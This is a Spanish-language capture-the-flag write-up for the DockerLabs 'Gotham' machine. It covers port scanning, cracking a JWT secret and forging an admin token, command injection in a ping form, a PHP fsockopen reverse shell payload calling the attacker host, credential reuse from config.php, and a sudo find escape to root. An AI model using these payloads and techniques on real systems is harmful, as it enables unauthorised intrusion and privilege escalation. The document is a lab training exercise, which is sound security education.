## Introducción

Este documento presenta la resolución completa de la máquina **Gotham**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone una aplicación web en el puerto 3000 que utiliza autenticación basada en JWT. Se identifica un comentario en el código fuente que revela credenciales de invitado (`guest:guest`), permitiendo el acceso inicial. Tras decodificar el token JWT, se detecta que utiliza un algoritmo débil (HS256) y se crackea la clave secreta, permitiendo forjar un token con rol `admin`.
Con acceso administrativo, se encuentra una funcionalidad de ping que permite inyección de comandos, obteniendo ejecución remota y una reverse shell como `www-data`. Posteriormente, se encuentra un archivo `config.php` con credenciales del usuario `bruce`, y finalmente se abusa del binario `find` con permisos sudo para escalar a `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Gotham.zip
sudo bash auto_deploy.sh Gotham.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Gotham/{content,exploits,nmap,scripts}
cd Gotham
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **3000/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1783220593/Ports_mrhf19.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,3000 172.17.0.2 -oN targeted
```

---

### 1.3 Enumeración web

Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 3000:

```bash
feroxbuster -u http://172.17.0.2:3000/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,js,txt,html
```

Todos los endpoints redirigen a un formulario de login:

![Login](https://res.cloudinary.com/dewqswzke/image/upload/v1783220593/Login_qp3fzx.png)

En el código fuente del login se encuentra un comentario con una pista: `guest:guest`:

![Hint](https://res.cloudinary.com/dewqswzke/image/upload/v1783220592/Hint_d4oldn.png)

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Acceso como guest

Se prueban las credenciales `guest:guest` y se obtiene acceso como usuario normal. Se asigna un token JWT que se decodifica:

```json
{
  "user": "guest",
  "role": "user",
  "iat": 1783213588
}
```

### 2.2 Forjado de token JWT

El token utiliza el algoritmo débil **HS256**. Se procede a crackear la clave secreta:

```bash
echo 'TOKEN' > jwt.txt
john --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt
```

Se obtiene la clave secreta y se forja un nuevo token con rol `admin`:

```json
{
  "user": "guest",
  "role": "admin",
  "iat": 1783213588
}
```

Se reemplaza el token antiguo por el nuevo y se recarga la página, obteniendo acceso como administrador:

![Admin view](https://res.cloudinary.com/dewqswzke/image/upload/v1783220592/Admin_du5sst.png)

### 2.3 RCE mediante inyección de comandos

Se accede al primer enlace del panel de administración:

![NOC view](https://res.cloudinary.com/dewqswzke/image/upload/v1783220593/Noc_usgeow.png)

El formulario permite realizar un ping a una IP. Se prueba una inyección de comandos:

```bash
;id
```

El comando se ejecuta correctamente:

![RCE](https://res.cloudinary.com/dewqswzke/image/upload/v1783220593/RCE_qolikc.png)

### 2.4 Reverse shell

Se inicia un listener en la máquina atacante:

```bash
nc -nlvp 443
```

Se envía el payload desde la web:

```
;php -r '$sock=fsockopen("172.17.0.1",443);exec("bash <&3 >&3 2>&3");'
```

![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1783220593/ReverseShell_mluytx.png)

## Paso 3 — Escalada de privilegios

### 3.1 De www-data → bruce

Se enumeran archivos de la aplicación web y se encuentra `config.php`:

![Config info](https://res.cloudinary.com/dewqswzke/image/upload/v1783220592/Config_cix91w.png)

El archivo contiene una contraseña para el usuario `bruce`. Se cambia al usuario:

```bash
su bruce
```

![Bruce](https://res.cloudinary.com/dewqswzke/image/upload/v1783220592/Bruce_bgwoxn.png)

### 3.2 De bruce → root

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l Bruce](https://res.cloudinary.com/dewqswzke/image/upload/v1783220615/Sudo-lBruce_d0cepx.png)

El usuario puede ejecutar `find` como root sin contraseña.

Se ejecuta el siguiente comando para obtener una shell con privilegios de root:

```bash
sudo find . -exec /bin/sh \; -quit
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1783220595/Root_t2dvra.png)
